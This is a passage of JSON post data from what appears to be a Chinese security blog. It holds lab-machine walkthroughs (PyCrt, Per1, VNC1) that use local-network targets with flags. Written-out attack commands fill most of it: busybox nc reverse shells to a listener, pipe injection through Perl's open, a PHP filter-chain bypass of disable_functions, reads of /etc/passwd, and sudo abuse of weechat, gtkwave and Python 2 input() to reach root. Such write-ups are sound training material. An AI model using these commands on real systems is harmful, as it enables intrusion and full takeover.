8888\n```\n\n**\u6784\u9020\u5e76\u6267\u884cPayload:**\n\n```bash\n# Payload: rev(base64('cmd:busybox nc 192.168.205.128 8888 -e /bin/bash'))\ncurl -X POST --data 'auth=LetMeIn123!' --data-urlencode 'payload=oNXY...' http://...\n```\n\n# **\u4e09\u3001\u6743\u9650\u63d0\u5347**\n\n## **1. www-data -> chatlake**\n\n\u83b7\u53d6\u521d\u6b65Shell\u540e\uff0c\u6267\u884c `sudo -l` \u67e5\u770b\u5f53\u524d\u7528\u6237\u7684 `sudo` \u6743\u9650\u3002\n\n```bash\nwww-data@PyCrt:/tmp$ sudo -l\n...\nUser www-data may run the following commands on PyCrt:\n    (chatlake) NOPASSWD: /usr/bin/weechat\n```\n\n\u53d1\u73b0 `www-data` \u7528\u6237\u53ef\u4ee5\u4ee5 `chatlake` \u7528\u6237\u7684\u8eab\u4efd\uff0c\u514d\u5bc6\u8fd0\u884c\u7ec8\u7aefIRC\u5ba2\u6237\u7aef `weechat`\u3002\u8fd9\u662f\u4e00\u4e2a\u63d0\u6743\u8def\u5f84\u3002\n\n1. \u9996\u5148\u7a33\u5b9a\u5f53\u524dshell\uff0c\u4f7f\u5176\u6210\u4e3a\u4e00\u4e2a\u529f\u80fd\u5b8c\u6574\u7684TTY\u3002\n\n2. \u6267\u884c\u63d0\u6743\u547d\u4ee4\uff0c\u542f\u52a8`weechat`\u3002\n\n   ```bash\n   sudo -u chatlake /usr/bin/weechat\n   ```\n\n3. \u5728 `weechat` \u5ba2\u6237\u7aef\u5185\u90e8\uff0c\u5229\u7528\u5176 `/exec` \u529f\u80fd\u6267\u884c\u547d\u4ee4\uff0c\u53cd\u5f39\u4e00\u4e2a\u65b0\u7684shell\u3002\n\n   ```\n   /exec busybox nc 192.168.205.128 9999 -e /bin/bash\n   ```\n\n4. \u5728\u672c\u5730 `9999` \u7aef\u53e3\u6210\u529f\u63a5\u6536\u5230 `chatlake` \u7528\u6237\u7684shell\u3002\n\n## **2. chatlake -> pycrtlake**\n\n\u83b7\u53d6 `chatlake` \u6743\u9650\u540e\uff0c\u518d\u6b21\u6267\u884c `sudo -l`\u3002\n\n```bash\nchatlake@PyCrt:~$ sudo -l\n...\nUser chatlake may run the following commands on PyCrt:\n    (ALL) NOPASSWD: /usr/bin/systemctl start irc_bot.service\n```\n\n`chatlake` \u53ef\u4ee5\u514d\u5bc6\u542f\u52a8\u4e00\u4e2a\u540d\u4e3a `irc_bot.service` \u7684\u670d\u52a1\u3002\u68c0\u67e5\u8be5\u670d\u52a1\u6587\u4ef6\u53d1\u73b0\uff0c\u5b83\u4f1a\u4ee5 `pycrtlake` \u7528\u6237\u8eab\u4efd\u8fd0\u884c\u4e00\u4e2aPython\u811a\u672c `/usr/local/bin/irc_bot.py`\uff0c\u4e14\u6211\u4eec\u65e0\u6cd5\u76f4\u63a5\u4fee\u6539\u8fd9\u4e24\u4e2a\u6587\u4ef6\u3002\n\n\u8fd9\u8868\u660e\u63d0\u6743\u9700\u8981\u4e0e\u8fd9\u4e2aIRC\u673a\u5668\u4eba\u8fdb\u884c\u4ea4\u4e92\u3002\n\n1.  \u9996\u5148\uff0c\u542f\u52a8\u8be5\u670d\u52a1\uff1a`sudo /usr/bin/systemctl start irc_bot.service`\u3002\n2.  \u4f7f\u7528 `weechat` \u5ba2\u6237\u7aef\u8fde\u63a5\u5230\u672c\u5730 `6667` \u7aef\u53e3\uff0c\u5e76\u52a0\u5165\u9891\u9053\u3002\n\n```\n/server add x localhost/6667\n/connect x\n/LIST\n         \u250200:56:17       x  -- | End of message of the day.\n         \u250200:56:46       x  -- | Channel Users Name\n         \u250200:56:46       x  -- | #chan2(1): [+nt]\n         \u250200:56:46       x  -- | #chan3(1): [+nt]\n         \u250200:56:46       x  -- | #chan4(1): [+nt]\n         \u250200:56:46       x  -- | #chan5(1): [+nt]\n         \u250200:56:46       x  -- | #chan6(1): [+nt]\n         \u250200:56:46       x  -- | #chan1(1): [+nt]\n```\n\n3.  \u5728\u9891\u90536\u4e2d\uff0c\u4e00\u4e2a\u540d\u4e3a `@admin` \u7684\u673a\u5668\u4eba\u63d0\u793a\u9700\u8981\u9075\u5faa\u201c\u683c\u5f0f\u8981\u6c42\u201d\uff0c\u5e76\u4ee5 `:)` \u7ed3\u5c3e\u3002\n4.  **\u53d1\u73b0\u6f0f\u6d1e\u5229\u7528\u6761\u4ef6\uff1a** \u4e0e\u673a\u5668\u4eba\u4ea4\u4e92\u540e\u53d1\u73b0\uff0c\u5176\u5b58\u5728\u4e00\u4e2a\u590d\u6742\u7684\u89e6\u53d1\u673a\u5236\uff1a\n    - **\u683c\u5f0f\u8981\u6c42\uff1a** \u547d\u4ee4\u5185\u5bb9\u5fc5\u987b\u662f**\u4ee5\u7a7a\u683c\u5206\u9694\u7684ASCII\u5341\u8fdb\u5236\u7f16\u7801**\uff0c\u5e76\u4ee5 :) \u7ed3\u5c3e\u3002\u5728\u6d4b\u8bd5\u4e2d\u53d1\u73b0\uff0c\u673a\u5668\u4eba\u4f1a\u62d2\u7edd\u6240\u6709\u5305\u542b\u5b57\u6bcd\u7684\u76f4\u63a5\u547d\u4ee4\uff0c\u4f46\u63a5\u53d7\u7eaf\u6570\u5b57\u8f93\u5165\uff0c\u8fd9\u5f3a\u70c8\u6697\u793a\u4e86\u9700\u8981\u8fdb\u884c\u7f16\u7801\u8f6c\u6362\u3002\n    - **\u7528\u6237\u540d\u8981\u6c42\uff1a** \u5fc5\u987b\u5c06\u81ea\u5df1\u7684\u6635\u79f0\u66f4\u6539\u4e3a ll104567 (/nick ll104567)\uff0c\u5426\u5219\u673a\u5668\u4eba\u4f1a\u62d2\u7edd\u6267\u884c\u547d\u4ee4\u3002\n    - **\u4ea4\u4e92\u903b\u8f91\uff1a** \u6784\u9020\u597d\u7684\u547d\u4ee4\u9700\u8981\u53d1\u9001\u5230 #chan1 \u516c\u5171\u9891\u9053\uff0c\u4f46\u547d\u4ee4\u7684\u6267\u884c\u7ed3\u679c\u4f1a\u7531\u673a\u5668\u4eba @admin **\u79c1\u804a**\u56de\u663e\u3002\n\n5. \u6839\u636e\u4ee5\u4e0a\u6761\u4ef6\uff0c\u6784\u9020\u53cd\u5f39shell\u7684ASCII\u7801payload\uff0c\u5e76\u5728#chan1\u9891\u9053\u53d1\u9001\u3002\n6. \u5728\u76d1\u542c\u7aef\u53e3\u6210\u529f\u63a5\u6536\u5230 pycrtlake \u7528\u6237\u7684shell\u3002\n\n## **3. pycrtlake -> root**\n\n\u8fd9\u662f\u6700\u540e\u4e00\u6b65\u63d0\u6743\u3002\u5728 `pycrtlake` shell\u4e2d\u6267\u884c `sudo -l`\u3002\n\n```bash\npycrtlake@PyCrt:~$ sudo -l\n...\nUser pycrtlake may run the following commands on PyCrt:\n    (ALL) NOPASSWD: /usr/bin/gtkwave\n```\n\n`pycrtlake` \u7528\u6237\u53ef\u4ee5\u514d\u5bc6\u4ee5 `root` \u8eab\u4efd\u8fd0\u884cGUI\u7a0b\u5e8f `gtkwave`\u3002\n\n1. \u76f4\u63a5\u8fd0\u884c\u4f1a\u56e0\u7f3a\u5c11 `DISPLAY` \u73af\u5883\u53d8\u91cf\u800c\u5931\u8d25\u3002\n\n2. \u8be5\u7a0b\u5e8f\u7684 `-W` \u547d\u4ee4\u884c\u6a21\u5f0f\u4e5f\u56e0\u540c\u6837\u539f\u56e0\u65e0\u6cd5\u76f4\u63a5\u4f7f\u7528\u3002\n\n3. **\u6700\u7ec8\u89e3\u51b3\u65b9\u6848\uff1a** \u4f7f\u7528 **Xvfb (X Virtual Framebuffer)** \u521b\u5efa\u4e00\u4e2a\u865a\u62df\u7684\u56fe\u5f62\u73af\u5883\u6765\u6b3a\u9a97 `gtkwave`\u3002\n\n4. \u9996\u5148\uff0c\u5728 `/tmp` \u76ee\u5f55\u542f\u52a8\u4e00\u4e2a\u865a\u62df\u663e\u793a\u670d\u52a1\u3002\n\n   ```bash\n   Xvfb :1 &\n   ```\n\n5. \u5229\u7528 `gtkwave` \u7684 `-W` (wish) \u53c2\u6570\uff0c\u5728\u6307\u5b9a\u7684\u865a\u62df\u663e\u793a\u73af\u5883\u4e2d\u542f\u52a8\u4e00\u4e2a\u62e5\u6709 `root` \u6743\u9650\u7684Tcl\u4ea4\u4e92\u5f0f\u547d\u4ee4\u884c\u3002\n\n   ```bash\n   sudo DISPLAY=:1 /usr/bin/gtkwave -W\n   ```\n\n6. \u547d\u4ee4\u6267\u884c\u540e\uff0c\u4f1a\u5f97\u5230\u4e00\u4e2aTcl\u7684\u63d0\u793a\u7b26 `%`\u3002\u5728\u8fd9\u4e2a `root` \u6743\u9650\u7684shell\u4e2d\uff0c\u53ef\u4ee5\u76f4\u63a5\u8bfb\u53d6 `root` \u76ee\u5f55\u4e0b\u7684\u6700\u7ec8flag\u3002\n\n   ```tcl\n   % id\n   uid=0(root) gid=0(root) groups=0(root)\n   % cat /root/root.txt /home/chatlake/user.txt\n   flag{e80ecc46ca5e00bf8a51c47f0cc3e868}\n   flag{b42baba466402e32157a1cbba819664e}\n   ```\n\nsentence", "top": 0, "createdAt": 1754719366, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-09", "dateLabelColor": "#0969da"}, "P199": {"htmlDir": "docs/post/nei-bu-_Per1.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_Per1", "postUrl": "post/nei-bu-_Per1.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/199", "commentNum": 0, "wordCount": 4477, "description": "# **\u4e00\u3001\u4fe1\u606f\u6536\u96c6**\n\n## **1. \u4e3b\u673a\u53d1\u73b0\u4e0e\u7aef\u53e3\u626b\u63cf**\n\n\u9996\u5148\u5728\u672c\u5730\u7f51\u7edc\u4e2d\u4f7f\u7528 `arp-scan` \u53d1\u73b0\u76ee\u6807\u4e3b\u673aIP\uff0c\u968f\u540e\u5229\u7528 `nmap` \u5bf9\u5176\u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf\uff0c\u4ee5\u8bc6\u522b\u5f00\u653e\u7684\u670d\u52a1\u3002\n\n**\u4e3b\u673a\u53d1\u73b0:**\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo arp-scan -l       \n...\n192.168.205.139 08:00:27:82:44:3a       PCS Systemtechnik GmbH\n...\n```\n\n**\u7aef\u53e3\u626b\u63cf:**\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap -p- 192.168.205.139\n...\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n...\n```\n\n\u626b\u63cf\u7ed3\u679c\u8868\u660e\uff0c\u76ee\u6807\u4e3b\u673aIP\u4e3a `192.168.205.139`\uff0c\u5f00\u653e\u4e86 **22 (SSH)** \u548c **80 (HTTP)** \u7aef\u53e3\u3002\n\n## **2. Web\u670d\u52a1\u4fa6\u5bdf**\n\n\u8bbf\u95ee80\u7aef\u53e3\uff0c\u53d1\u73b0\u662f\u4e00\u4e2a\u5173\u4e8ePerl\u8bed\u8a00\u7684\u9759\u6001\u9875\u9762\u3002\u67e5\u770b\u9875\u9762\u6e90\u4ee3\u7801\uff0c\u5728\u5176\u4e2d\u53d1\u73b0\u4e00\u6761\u5173\u952e\u7ebf\u7d22\u3002\n\n```html\n...\n<div><!-- cgi --></div>\n...\n```\n\nHTML\u6ce8\u91ca\u4e2d\u51fa\u73b0\u7684 `cgi` \u5f3a\u70c8\u6697\u793aWeb\u670d\u52a1\u4e0a\u53ef\u80fd\u5b58\u5728CGI\u811a\u672c\uff0c\u8fd9\u901a\u5e38\u662fWeb\u5e94\u7528\u7684\u4e00\u4e2a\u91cd\u8981\u653b\u51fb\u9762\u3002\n\n# **\u4e8c\u3001\u6f0f\u6d1e\u53d1\u73b0\u4e0e\u521d\u59cb\u8bbf\u95ee**\n\n## **1. CGI\u76ee\u5f55\u4e0e\u6587\u4ef6\u626b\u63cf**\n\n\u6839\u636e\u4e0a\u4e00\u6b65\u7684\u7ebf\u7d22\uff0c\u6211\u4eec\u91cd\u70b9\u5bf9CGI\u76f8\u5173\u76ee\u5f55\u8fdb\u884c\u626b\u63cf\u3002\u4f7f\u7528 `gobuster` \u5bf9 `/cgi-bin/` \u76ee\u5f55\u8fdb\u884c\u6df1\u5ea6\u626b\u63cf\uff0c\u6210\u529f\u53d1\u73b0\u4e00\u4e2a\u53ef\u7591\u7684CGI\u811a\u672c\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ gobuster dir -u http://192.168.205.139/cgi-bin/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x cgi,pl -t 64\n...\n/file.cgi             (Status: 200) [Size: 22]\n...\n```\n\n\u626b\u63cf\u627e\u5230\u4e86 `file.cgi` \u6587\u4ef6\uff0c\u8fd9\u662f\u6211\u4eec\u7684\u4e3b\u8981\u7a81\u7834\u53e3\u3002\n\n## **2. LFI \u5230 RCE (Perl `open` \u51fd\u6570\u6f0f\u6d1e)**\n\n\u5bf9\u53d1\u73b0\u7684 `file.cgi` \u8fdb\u884c\u53c2\u6570\u6a21\u7cca\u6d4b\u8bd5\uff0c\u53d1\u73b0\u4e00\u4e2a `file` \u53c2\u6570\u5b58\u5728\u672c\u5730\u6587\u4ef6\u5305\u542b (LFI) \u6f0f\u6d1e\u3002\n\n**\u9a8c\u8bc1LFI\u6f0f\u6d1e:**\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl '192.168.205.139/cgi-bin/file.cgi?file=/etc/passwd'\nroot:x:0:0:root:/root:/bin/bash\n...\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n...\nsunset:x:1001:1001:,,,:/home/sunset:/bin/bash\n```\n\n\u6210\u529f\u8bfb\u53d6 `/etc/passwd` \u6587\u4ef6\u3002\u5229\u7528\u6b64\u6f0f\u6d1e\u8bfb\u53d6 `file.cgi` \u81ea\u8eab\u7684\u6e90\u4ee3\u7801\u3002\n\n**\u6e90\u7801\u5ba1\u8ba1:**\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl '192.168.205.139/cgi-bin/file.cgi?file=file.cgi'   \n#!/usr/bin/perl\nuse CGI;\nprint CGI::header();\nmy $input = CGI::param('file');\nif($input) {\n    open(FILE, $input);\n    print while <FILE>;\n    close(FILE);\n}\nelse {\n    print 'Missing file parameter';\n}\n```\n\n\u6e90\u7801\u7684\u6838\u5fc3\u95ee\u9898\u5728\u4e8e `open(FILE, $input);`\u3002\u5728Perl\u4e2d\uff0c\u8fd9\u79cd\u53cc\u53c2\u6570\u7684 `open` \u51fd\u6570\u975e\u5e38\u5371\u9669\u3002\u5f53\u4f20\u9012\u7684\u53c2\u6570\u4ee5\u7ba1\u9053\u7b26 `|` \u7ed3\u5c3e\u65f6\uff0cPerl\u4f1a\u5c06\u5176\u540e\u7684\u5b57\u7b26\u4e32\u4f5c\u4e3a\u547d\u4ee4\u6765\u6267\u884c\u3002\u8fd9\u4f7f\u6211\u4eec\u80fd\u591f\u5c06LFI\u6f0f\u6d1e\u76f4\u63a5\u5347\u7ea7\u4e3a\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c (RCE) \u6f0f\u6d1e\u3002\n\n## **3. \u83b7\u53d6 www-data Shell**\n\n**\u9a8c\u8bc1RCE\u6f0f\u6d1e:**\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl '192.168.205.139/cgi-bin/file.cgi?file=id|'     \nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n\n\u6210\u529f\u6267\u884c `id` \u547d\u4ee4\u3002\u63a5\u4e0b\u6765\uff0c\u6784\u9020\u53cd\u5f39Shell\u7684Payload\uff0c\u5728\u672c\u5730\u5f00\u542f\u76d1\u542c\uff0c\u6210\u529f\u83b7\u53d6 `www-data` \u7528\u6237\u7684\u4ea4\u4e92\u5f0fShell\u3002\n\n**\u672c\u5730\u76d1\u542c:**\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nc -lvnp 8888\n```\n\n**\u6784\u9020\u5e76\u6267\u884cPayload:**\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl '192.168.205.139/cgi-bin/file.cgi?file=busybox+nc+192.168.205.128+8888+-e+/bin/bash|'\n```\n\n**\u83b7\u53d6Shell\u5e76\u7a33\u5b9aTTY:**\n\n```bash\nconnect to [192.168.205.128] from (UNKNOWN) [192.168.205.139] 37298\n# \u4f7f\u7528 script \u7a33\u5b9aShell\nscript /dev/null -c bash\n# \u4f7f\u7528 Ctrl+Z \u5c06\u5176\u7f6e\u4e8e\u540e\u53f0\uff0c\u7136\u540e\u4f7f\u7528 stty \u4fee\u590d\u7ec8\u7aef\nCtrl+Z\nstty raw -echo; fg\nreset xterm\nexport TERM=xterm\nexport SHELL=/bin/bash\nstty rows 24 columns 80\n```\n\n# **\u4e09\u3001\u6743\u9650\u63d0\u5347**\n\n## **1. www-data -> sunset**\n\n\u5728\u83b7\u53d6 `www-data` \u6743\u9650\u540e\uff0c\u5bf9\u7cfb\u7edf\u8fdb\u884c\u4fe1\u606f\u641c\u96c6\u3002\u5728 `/opt` \u76ee\u5f55\u4e0b\u53d1\u73b0\u4e00\u4e2a\u53ef\u7591\u7684Perl\u811a\u672c `password.pl`\u3002\n\n```bash\nwww-data@Per1:/opt$ ls -al\n...\n-rwxr-xr-x  1 sunset sunset  893 Aug  8 09:07 password.pl\n```\n\n\u8be5\u811a\u672c\u5c5e\u4e8e `sunset` \u7528\u6237\u3002\u6267\u884c\u6b64\u811a\u672c\uff0c\u5f97\u5230\u4e00\u4e2a\u5b57\u7b26\u4e32\u3002\n\n```bash\nwww-data@Per1:/opt$ perl password.pl \ndylan4\n```\n\n\u8fd9\u5f88\u53ef\u80fd\u662f `sunset` \u7528\u6237\u7684\u5bc6\u7801\u3002\u4f7f\u7528 `su` \u547d\u4ee4\u548c\u8be5\u5bc6\u7801\u8fdb\u884c\u5c1d\u8bd5\u3002\n\n```bash\nwww-data@Per1:/opt$ su sunset\nPassword: dylan4\nsunset@Per1:/opt$ id\nuid=1001(sunset) gid=1001(sunset) groups=1001(sunset)\n```\n\n\u6210\u529f\u5207\u6362\u5230 `sunset` \u7528\u6237\u3002\u5728\u6b64\u7528\u6237\u5bb6\u76ee\u5f55\u4e0b\u627e\u5230\u7b2c\u4e00\u4e2aflag\u3002\n\n```bash\nsunset@Per1:/opt$ cat /home/sunset/user.txt\nflag{user-5b5b8e9b01ef27a1cc0a2d5fa87d7190}\n```\n\n## **2. sunset -> root **\n\n\u83b7\u53d6 `sunset` \u6743\u9650\u540e\uff0c\u7acb\u523b\u68c0\u67e5\u5176 `sudo` \u6743\u9650\u3002\n\n```bash\nsunset@Per1:/opt$ sudo -l\n...\nUser sunset may run the following commands on Per1:\n    (ALL) NOPASSWD: /usr/bin/python /usr/bin/guess_game.py\n```\n\n`sunset` \u7528\u6237\u53ef\u4ee5\u514d\u5bc6\u4ee5 `root` \u6743\u9650\u8fd0\u884c `/usr/bin/guess_game.py` \u811a\u672c\u3002\u67e5\u770b\u8be5\u811a\u672c\u6e90\u7801\u3002\n\n```bash\nsunset@Per1:/opt$ cat /usr/bin/guess_game.py\nimport random\n\ndef guess_game():\n    ...\n    try:\n        user_input = input('Your guess: ')  \n    except Exception as e:\n        print 'Error:', e\n        return\n    ...\n```\n\n\u6b64\u811a\u672c\u4f7f\u7528 `python` (\u5373Python 2) \u6267\u884c\uff0c\u5e76\u4e14\u5728\u4ee3\u7801\u4e2d\u4f7f\u7528\u4e86\u6781\u5176\u5371\u9669\u7684 `input()` \u51fd\u6570\u3002\u5728Python 2\u4e2d\uff0c`input()` \u4f1a\u5c06\u7528\u6237\u7684\u8f93\u5165\u5f53\u4f5cPython\u4ee3\u7801\u6765\u6267\u884c\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u8f93\u5165\u4e00\u6bb5\u80fd\u591f\u542f\u52a8shell\u7684Python\u4ee3\u7801\uff0c\u8be5\u4ee3\u7801\u5c06\u4ee5 `root` \u6743\u9650\u6267\u884c\u3002\n\n**\u6784\u9020\u5e76\u6267\u884c\u63d0\u6743Payload:**\n\n```bash\nsunset@Per1:/opt$ sudo /usr/bin/python /usr/bin/guess_game.py\nWelcome to the guess game!\nI've chosen a number between 0 and 65535.\nYour guess: __import__('os').system('/bin/bash')\n```\n\n\u8f93\u5165Payload\u540e\uff0c\u6210\u529f\u83b7\u53d6 `root` \u6743\u9650\u7684shell\u3002\n\n**\u83b7\u53d6\u6700\u7ec8Flag:**\n\n```bash\nroot@Per1:/opt# id\nuid=0(root) gid=0(root) groups=0(root)\nroot@Per1:/opt# cat /root/root.txt /home/sunset/user.txt \nflag{root-c27679de03aba03c5a33159aef11f8ea}\nflag{user-5b5b8e9b01ef27a1cc0a2d5fa87d7190}\n```\n\n\u81f3\u6b64\uff0c\u9776\u673a\u5b8c\u5168\u653b\u7834\u3002sentence", "top": 0, "createdAt": 1754748233, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-09", "dateLabelColor": "#0969da"}, "P200": {"htmlDir": "docs/post/nei-bu-_VNC1.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_VNC1", "postUrl": "post/nei-bu-_VNC1.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/200", "commentNum": 0, "wordCount": 5025, "description": "# **\u4e00\u3001\u4fe1\u606f\u6536\u96c6**\n\n## **1. \u4e3b\u673a\u53d1\u73b0\u4e0e\u7aef\u53e3\u626b\u63cf**\n\n\u9996\u5148\u5728\u672c\u5730\u7f51\u7edc\u4e2d\u4f7f\u7528 `arp-scan` \u53d1\u73b0\u76ee\u6807\u4e3b\u673aIP\uff0c\u968f\u540e\u5229\u7528 `nmap` \u5bf9\u5176\u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf\uff0c\u4ee5\u8bc6\u522b\u5f00\u653e\u7684\u670d\u52a1\u3002\n\n**\u4e3b\u673a\u53d1\u73b0:**\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo arp-scan -l\n...\n192.168.205.140 08:00:27:23:44:a3       PCS Systemtechnik GmbH\n...\n```\n\n**\u7aef\u53e3\u626b\u63cf:**\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap -p- 192.168.205.140\n...\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n5901/tcp open  vnc-1\n...\n```\n\n\u626b\u63cf\u7ed3\u679c\u8868\u660e\uff0c\u76ee\u6807\u4e3b\u673aIP\u4e3a `192.168.205.140`\uff0c\u5f00\u653e\u4e86 **22 (SSH)**\u3001**80 (HTTP)** \u548c **5901 (VNC)** \u7aef\u53e3\u3002\n\n**VNC\u670d\u52a1\u4fa6\u5bdf:**\n\u5bf95901\u7aef\u53e3\u8fdb\u884c\u8be6\u7ec6\u7684\u670d\u52a1\u626b\u63cf\uff0c\u786e\u8ba4\u5176\u4e3aVNC\u670d\u52a1\uff0c\u5e76\u652f\u6301\u6807\u51c6\u7684\u5bc6\u7801\u8ba4\u8bc1\uff0c\u8fd9\u4e3a\u540e\u7eed\u7684\u6a2a\u5411\u79fb\u52a8\u63d0\u4f9b\u4e86\u6f5c\u5728\u7684\u653b\u51fb\u9762\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap -p5901 -sV -sC 192.168.205.140\n...\nPORT     STATE SERVICE VERSION\n5901/tcp open  vnc     VNC (protocol 3.8)\n| vnc-info: \n|   Protocol version: 3.8\n|   Security types: \n|     VNC Authentication (2)\n...\n```\n\n# **\u4e8c\u3001\u6f0f\u6d1e\u53d1\u73b0\u4e0e\u521d\u59cb\u8bbf\u95ee**\n\n## **1. Web\u670d\u52a1LFI\u6f0f\u6d1e**\n\n\u8bbf\u95ee80\u7aef\u53e3\uff0c\u53d1\u73b0\u662f\u4e00\u4e2aLFI\u6f0f\u6d1e\u7684\u6d4b\u8bd5\u9875\u9762\u3002\u901a\u8fc7 `file` \u53c2\u6570\u53ef\u4ee5\u5305\u542b\u4efb\u610f\u6587\u4ef6\u3002\n\n**\u9a8c\u8bc1LFI\u6f0f\u6d1e:**\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl 'http://192.168.205.140/index.php?file=/etc/passwd'\nroot:x:0:0:root:/root:/bin/bash\n...\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n...\ntodd:x:1000:1000:,,,:/home/todd:/bin/bash\n...\n```\n\n\u6210\u529f\u8bfb\u53d6 `/etc/passwd` \u6587\u4ef6\uff0c\u786e\u8ba4\u4e86LFI\u6f0f\u6d1e\u7684\u5b58\u5728\u3002\n\n## **2. LFI Bypass `disable_functions` RCE**\n\n\u901a\u8fc7`php://filter`\u8bfb\u53d6`phpinfo`\u53d1\u73b0\uff0c\u76ee\u6807PHP\u73af\u5883\u7981\u7528\u4e86 `system`, `passthru`, `shell_exec` \u7b49\u5e38\u7528\u547d\u4ee4\u6267\u884c\u51fd\u6570\uff0c\u5bfc\u81f4\u4f20\u7edf\u7684LFI to RCE\u65b9\u6cd5\u5931\u6548\u3002\n\n```\ndisable_functions\tsystem,passthru,shell_exec,proc_open,pcntl_exec,dl\n```\n\n\u7136\u800c\uff0c\u6211\u4eec\u53ef\u4ee5\u6362\u4e00\u4e2a\u5e38\u7528\u547d\u4ee4\u6267\u884c\u51fd\u6570\uff0c\u6700\u7ec8\u7ed5\u8fc7`disable_functions`\u7684\u9650\u5236\u6765\u6267\u884c\u4ee3\u7801\u3002\n\n\u6211\u4eec\u4f7f\u7528 `php_filter_chain_generator` \u5de5\u5177\u6765\u751f\u6210\u80fd\u591f\u6267\u884c `exec($_GET['0']);` \u7684Payload\u3002\n\n> https://github.com/synacktiv/php_filter_chain_generator\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/php_filter_chain_generator]\n\u2514\u2500$ python3 php_filter_chain_generator.py --chain '<?php exec($_GET['0']); ?>'\n\n[+] The following gadget chain will generate the following code : <?php exec($_GET['0']); ?>\nphp://filter/convert.iconv.UTF8.CSISO2022KR|...|convert.base64-decode/resource=php://temp\n```\n\n## **3. \u83b7\u53d6 www-data Shell**\n\n\u5c06\u751f\u6210\u7684Payload\u9644\u52a0\u5230URL\u4e2d\uff0c\u5e76\u901a\u8fc7 `0` \u53c2\u6570\u4f20\u9012\u53cd\u5f39shell\u547d\u4ee4\uff0c\u5728\u672c\u5730\u5f00\u542f\u76d1\u542c\uff0c\u6210\u529f\u83b7\u53d6 `www-data` \u7528\u6237\u7684\u4ea4\u4e92\u5f0fShell\u3002\n\n**\u672c\u5730\u76d1\u542c:**\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/php_filter_chain_generator]\n\u2514\u2500$ nc -lvnp 8888\n```\n\n**\u6267\u884cPayload\u83b7\u53d6Shell:**\n(\u5c06 `[CHAIN]` \u66ff\u6362\u4e3a\u4e0a\u9762\u5de5\u5177\u751f\u6210\u7684\u5b8c\u6574\u8fc7\u6ee4\u5668\u94fe)\n\n```bash\nhttp://192.168.205.140/index.php?file=[CHAIN]&0=busybox nc 192.168.205.128 8888 -e /bin/bash\n```\n\n**\u83b7\u53d6Shell\u5e76\u7a33\u5b9aTTY:**\n\n```bash\nlistening on [any] 8888 ...\nconnect to [192.168.205.128] from (UNKNOWN) [192.168.205.140] 48454\nid\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n\n# \u4f7f\u7528 script \u7a33\u5b9aShell\nscript /dev/null -c bash\n# \u4f7f\u7528 Ctrl+Z \u5c06\u5176\u7f6e\u4e8e\u540e\u53f0\uff0c\u7136\u540e\u4f7f\u7528 stty \u4fee\u590d\u7ec8\u7aef\nCtrl+Z\nstty raw -echo; fg\nreset xterm\nexport TERM=xterm\nexport SHELL=/bin/bash\nstty rows 24 columns 80\n```\n\n# **\u4e09\u3001\u6743\u9650\u63d0\u5347**\n\n## **1. www-data -> todd (\u6a2a\u5411\u79fb\u52a8)**\n\n\u5728 `www-data` shell\u4e2d\u8fdb\u884c\u4fe1\u606f\u641c\u96c6\uff0c\u5728\u7528\u6237 `todd` 